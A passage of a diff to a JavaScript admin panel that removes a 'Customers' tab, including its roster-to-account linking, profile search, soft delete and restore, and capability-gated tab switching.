-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-// Create a roster entry already attached to an account, so the pair can never
-// start life relying on an email match.
-// 23505 here always means the same thing: some other roster entry, live or in
-// the trash, already claims that account. Telling the admin to look in the
-// trash is far more useful than the constraint name.
-function _custLinkError(error) {
-  const code = error && (error.code || '');
-  if (String(code) === '23505') { alert(t('admin_customers_link_taken')); return; }
-  alert(t('admin_members_save_failed') + ((error && error.message) || ''));
-}
-
-async function customersAddRosterForProfile(profileId) {
-  if (!requireCapability('can_manage_members')) return;
-  const c = _custCurrentRow();
-  if (!c) return;
-  const session = (await sb.auth.getSession()).data.session;
-  const createdBy = session && session.user ? session.user.email : null;
-  if (!createdBy) { alert(t('admin_customers_no_session')); return; }
-  const { error } = await sb.from('members').insert({
-    name: c.display_name || c.primary_email || '',
-    email: c.primary_email || null,
-    profile_id: profileId,
-    membership_status: 'Active',
-    fb_group_member: 'Yes',
-    validated: false,
-    created_by_email: createdBy,
-  });
-  if (error) { _custLinkError(error); return; }
-  _customersState._member = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-// Attach an existing roster entry to an account. Typeahead over profiles,
-// the same shape the Add Order customer picker uses.
-async function customersLinkSearch(q) {
-  const el = document.getElementById('cuLinkResults');
-  if (!el) return;
-  // Same sanitising rule as the Add Order customer search (13752): commas and
-  // parens are PostgREST's own or() delimiters, so a name like "Meyer, Anna"
-  // would otherwise be parsed as extra filter conditions and 400 the request.
-  const term = (q || '').replace(/[,*()%:]/g, ' ').trim();
-  if (term.length < 2) { el.innerHTML = ''; return; }
-  const like = '%' + term.replace(/[%_]/g, '') + '%';
-  const { data, error } = await sb.from('profiles')
-    .select('id, first_name, last_name, email')
-    .or(`email.ilike.${like},first_name.ilike.${like},last_name.ilike.${like}`)
-    .limit(8);
-  if (error) { el.innerHTML = `<div style="font-size:12px;color:#c66">${escapeHtml(error.message || '')}</div>`; return; }
-  if (!data || !data.length) { el.innerHTML = `<div style="font-size:12px;color:var(--cream-dim);font-style:italic">${escapeHtml(t('admin_customers_link_none'))}</div>`; return; }
-  const c = _custCurrentRow();
-  const memberId = c ? c.member_id : null;
-  el.innerHTML = data.map(p => {
-    const nm = _custProperName(((p.first_name || '') + ' ' + (p.last_name || '')).trim()) || p.email || '';
-    return `<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;padding:7px 10px;border:1px solid var(--line2);border-radius:4px;margin-bottom:6px">
-      <span style="font-size:13px;color:var(--cream)">${escapeHtml(nm)} <span style="font-family:'DM Mono',monospace;font-size:11px;color:var(--cream-dim)">${escapeHtml(p.email || '')}</span></span>
-      <button class="btn btn-outline btn-sm" onclick="customersLinkAccount('${escapeHtml(memberId || '')}','${escapeHtml(p.id)}')" data-t="admin_customers_link_btn"></button>
-    </div>`;
-  }).join('');
-  if (typeof applyT === 'function') applyT();
-}
-
-async function customersLinkAccount(memberId, profileId) {
-  if (!requireCapability('can_manage_members')) return;
-  if (!memberId || !profileId) return;
-  if (!confirm(t('admin_customers_link_confirm'))) return;
-  const { error } = await sb.from('members').update({ profile_id: profileId }).eq('id', memberId);
-  if (error) { _custLinkError(error); return; }
-  // The person's identity is now the account, so the row key changes with it.
-  _customersState.openKey = 'p:' + profileId;
-  _customersState._profile = null;
-  _customersState._member = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-async function customersUnlink(memberId) {
-  if (!requireCapability('can_manage_members')) return;
-  if (!confirm(t('admin_customers_unlink_confirm'))) return;
-  const { error } = await sb.from('members').update({ profile_id: null }).eq('id', memberId);
-  if (error) { alert(t('admin_members_save_failed') + (error.message || '')); return; }
-  _customersState._member = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-async function customersDeleteRoster(memberId) {
-  if (!requireCapability('can_manage_members')) return;
-  if (!confirm(t('admin_members_confirm_delete'))) return;
-  const session = (await sb.auth.getSession()).data.session;
-  const actorEmail = session && session.user ? session.user.email : null;
-  const { error } = await sb.from('members').update({
-    deleted_at: new Date().toISOString(),
-    deleted_by_email: actorEmail,
-  }).eq('id', memberId);
-  if (error) { alert(t('admin_members_delete_failed') + (error.message || '')); return; }
-  _customersState._member = null;
-  _customersState._useCache = false;
-  // A roster-only person has just left the live list; there is nothing to
-  // show. A linked person keeps their account row, so stay on it.
-  const c = _custCurrentRow();
-  if (c && !c.profile_id && !_customersState.showDeleted) _customersState.openKey = null;
-  await renderAdminCustomers();
-}
-
-async function customersRestoreRoster(memberId) {
-  if (!requireCapability('can_manage_members')) return;
-  if (!confirm(t('admin_members_confirm_restore'))) return;
-  const { error } = await sb.from('members').update({ deleted_at: null, deleted_by_email: null }).eq('id', memberId);
-  if (error) { alert(t('admin_members_save_failed') + (error.message || '')); return; }
-  _customersState._member = null;
-  _customersState._useCache = false;
-  await renderAdminCustomers();
-}
-
-// ── wrappers around the roster-wide operations ────────────────────────
-// adminMembersMassDelete / adminMembersEmptyTrash / the CSV import all end by
-// repainting #adminMembers, which is the hidden tab when they are driven from
-// here. Without these the roster would change in the database while this list
-// kept showing the pre-change snapshot, and because search and filters reuse
-// _cache the deleted people would keep reappearing on every keystroke.
-async function customersMassDeleteRoster() {
-  if (!requireCapability('can_manage_members')) return;
-  await adminMembersMassDelete();
-  _customersState.openKey = null;   // whoever was open may be in the trash now
-  await adminRefreshPeopleSurfaces();
-}
-
-async function customersEmptyRosterTrash() {
-  if (!isOwner()) { try { alert(t('cap_required_msg')); } catch (e) {} return; }
-  await adminMembersEmptyTrash();
-  _customersState.openKey = null;
-  await adminRefreshPeopleSurfaces();
-}
-
-function customersImportRoster() {
-  if (!requireCapability('can_manage_members')) return;
-  _customersState._importedFromCustomers = true;   // read by adminMembersFinishImport
-  adminMembersOpenImport();
-}
-
-// The list toolbar's Add button. Roster entries created here have no account
-// yet; the profile view offers the link once one exists.
-async function customersStartAddRoster() {
-  if (!requireCapability('can_manage_members')) return;
-  const name = prompt(t('admin_customers_add_roster_prompt'));
-  if (name === null) return;
-  const trimmed = name.trim();
-  if (!trimmed) { alert(t('admin_members_name_required')); return; }
-  const session = (await sb.auth.getSession()).data.session;
-  const createdBy = session && session.user ? session.user.email : null;
-  if (!createdBy) { alert(t('admin_customers_no_session')); return; }
-  const { data, error } = await sb.from('members').insert({
-    name: trimmed,
-    membership_status: 'Active',
-    fb_group_member: 'Yes',
-    validated: false,
-    created_by_email: createdBy,
-  }).select('id').single();
-  if (error) { alert(t('admin_members_save_failed') + (error.message || '')); return; }
-  _customersState._useCache = false;
-  if (data && data.id) customersOpen('m:' + data.id);
-  else await renderAdminCustomers();
-}
-
-
-// ═══════════════════════════════════════════════════════════════════════
 // Each admin tab button has a required capability or Owner status. Non-Owners
 // without the required capability never see the button — they can't click
 // what isn't rendered.
@@ -26402,7 +24334,6 @@ async function customersStartAddRoster() {
 // current user should see the tab.
 const ADMIN_TAB_CAPABILITY_MAP = {
   // Tabs that any admin can see (no destructive actions, view/edit-bounded)
-  adminTabCustomers: () => hasCapability('can_manage_members'),   // Phase 7.16 - same gate the Members tab used; this tab shows the whole roster
   adminTabAccounts:  () => true,
   adminTabOrders:    () => true,  // edit gated within tab, but viewing is fine
   adminTabHistory:   () => true,
@@ -26573,7 +24504,6 @@ function adminTab(tab) {
   if (typeof startAdminAutoRefresh === 'function') startAdminAutoRefresh();
   // Phase 6.43: update the admin section title to reflect current tab
   const titleKeyMap = {
-    customers: 'admin_tab_customers',   // Phase 7.16
     accounts: 'admin_accounts',
     orders:   'admin_orders',
     history:  'admin_history',
@@ -26593,7 +24523,6 @@ function adminTab(tab) {
     titleEl.setAttribute('data-t', key);
     if (typeof t === 'function') titleEl.textContent = t(key);
   }
-  document.getElementById('adminCustomers').style.display = tab === 'customers' ? 'block' : 'none';
   document.getElementById('adminAccounts').style.display = tab === 'accounts' ? 'block' : 'none';
   document.getElementById('adminOrders').style.display = tab === 'orders' ? 'block' : 'none';
   document.getElementById('adminHistory').style.display = tab === 'history' ? 'block' : 'none';
@@ -26606,7 +24535,6 @@ function adminTab(tab) {
   document.getElementById('adminProducts').style.display = tab === 'products' ? 'block' : 'none';
   document.getElementById('adminLottery').style.display = tab === 'lottery' ? 'block' : 'none';
   document.getElementById('adminAdmins').style.display = tab === 'admins' ? 'block' : 'none';
-  document.getElementById('adminTabCustomers').className = 'btn btn-sm ' + (tab === 'customers' ? 'btn-outline' : 'btn-ghost');
   document.getElementById('adminTabAccounts').className = 'btn btn-sm ' + (tab === 'accounts' ? 'btn-outline' : 'btn-ghost');
   document.getElementById('adminTabOrders').className = 'btn btn-sm ' + (tab === 'orders' ? 'btn-outline' : 'btn-ghost');
   document.getElementById('adminTabHistory').className = 'btn btn-sm ' + (tab === 'history' ? 'btn-outline' : 'btn-ghost');
@@ -26620,12 +24548,6 @@ function adminTab(tab) {
   document.getElementById('adminTabLottery').className = 'btn btn-sm ' + (tab === 'lottery' ? 'btn-outline' : 'btn-ghost');
   const tabAdmins = document.getElementById('adminTabAdmins');
   if (tabAdmins) tabAdmins.className = 'btn btn-sm ' + (tab === 'admins' ? 'btn-outline' : 'btn-ghost');
-  if (tab === 'customers' && typeof renderAdminCustomers === 'function') renderAdminCustomers();
-  // Phase 7.16: every other tab re-renders on switch; Accounts only ever
-  // rendered once, from renderAdmin(). That was harmless while it was the sole
-  // owner of profile data, but a mutation made from Customers now leaves it
-  // stale until the panel is reopened.
-  if (tab === 'accounts' && typeof renderAdminAccounts === 'function') renderAdminAccounts();
   if (tab === 'history' && typeof renderAdminHistory === 'function') renderAdminHistory();
   if (tab === 'quantity' && typeof renderAdminQuantity === 'function') renderAdminQuantity();
   if (tab === 'schedule' && typeof renderAdminSchedule === 'function') renderAdminSchedule();
